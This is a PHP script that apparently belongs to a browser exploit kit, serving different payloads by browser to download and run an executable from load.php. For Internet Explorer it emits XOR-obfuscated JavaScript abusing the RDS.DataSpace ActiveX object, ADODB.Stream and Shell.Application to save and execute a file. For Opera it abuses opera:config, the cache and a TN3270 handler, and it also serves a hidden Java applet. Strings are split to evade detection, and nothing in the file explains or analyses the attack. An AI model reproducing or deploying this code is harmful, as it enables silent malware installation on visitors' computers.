<?
$url = "http://".$_SERVER["HTTP_HOST"].str_replace ("\\", "/", dirname ($_SERVER["PHP_SELF"]))."/load.php";
function encode ($content) {
	$str = trim (strip_tags ($content));
	$new = "";
	for ($i = 0; $i < strlen ($str); $i ++) $new .= chr (ord ($str[$i]) ^ 1);
	return '<script language=JavaScript>str = "'.$new.'";str2 = "";for (i = 0; i < str.length; i ++) { str2 = str2 + String.fromCharCode (str.charCodeAt (i) ^ 1); }; eval (str2);</script>';
}
if ($java == true) echo '<applet archive="java.php" code="BaaaaBaa.class" width=1  height=1><param name="url" value="'.$url.'"></applet>';
elseif ($browser == "MSIE") echo '<html><head><meta HTTP-EQUIV="REFRESH" content="3; URL=index.php?404">'.encode ('<script language="JavaScript">
start();
function start() {
var zad = document.createElement(\'object\');
zad.setAttribute(\'id\',\'zad\');
zad.setAttribute(\'classid\',\'cl\'+\'si\'+"d:BD"+"96C5"+\'56-65A3-1\'+"1D0-98"+\'3A-00\'+"C04"+\'FC2\'+"9E"+\'36\');
try {
var q = zad.CreateObject(\'ms\'+"xm"+\'l2\'+"."+\'XM\'+"LH"+\'T\'+\'TP\',\'\');
var s = zad.CreateObject("Shel"+"l.Ap"+"pl"+"icati"+"on",\'\');
var t = zad.CreateObject(\'ad\'+\'od\'+"b."+\'st\'+"re"+\'am\',\'\');
try { t.type = 1;
q.open(\'G\'+"E"+\'T\',\''.$url.'\',false);
q.send(); t.open();
t.Write(q.responseBody);
var name = \'.//..//iexplorer.exe\';
t.SaveToFile(name,2);
t.Close();
} catch(e) {}
try { s.shellexecute(name); } catch(e) {}}
catch(e){}}
</script>')."</head></html>";
elseif ($browser == "Opera") echo encode ('<script language="JavaScript">
blank_iframe = document.createElement(\'iframe\');
blank_iframe.src = \'about:blank\';
blank_iframe.setAttribute(\'id\', \'blank_iframe_window\');
blank_iframe.setAttribute(\'style\', \'display:none\');
document.appendChild(blank_iframe);
blank_iframe_window.eval ("config_iframe = document.createElement(\'iframe\');\
config_iframe.setAttribute(\'id\', \'config_iframe_window\');\
config_iframe.src = \'opera:config\';\
document.appendChild(config_iframe);\
app_iframe = document.createElement(\'script\');\
cache_iframe = document.createElement(\'iframe\');\
app_iframe.src = \'<?php echo $url; ?>\';\
app_iframe.onload = function ()\
{\
cache_iframe.src = \'opera:cache\';\
cache_iframe.onload = function ()\
{\
cache = cache_iframe.contentDocument.childNodes[0].innerHTML.toUpperCase();\
var re = new RegExp(\'(OPR\\\\w{5}.EXE)</TD>\\\\s*<TD>\\\\d+</TD>\\\\s*<TD><A HREF=\"\'+app_iframe.src.toUpperCase(), \'\');\
filename = cache.match(re);\
config_iframe_window.eval\
(\"\
opera.setPreference(\'Network\',\'TN3270 App\',opera.getPreference(\'User Prefs\',\'Cache Directory4\')+parent.filename[1]);\
app_link = document.createElement(\'a\');\
app_link.setAttribute(\'href\', \'tn3270://nothing\');\
app_link.click();\
setTimeout(function () {opera.setPreference(\'Network\',\'TN3270 App\',\'telnet.exe\')},1000);\
\");\
};\
document.appendChild(cache_iframe);\
};\
document.appendChild(app_iframe);");
</script>');
?>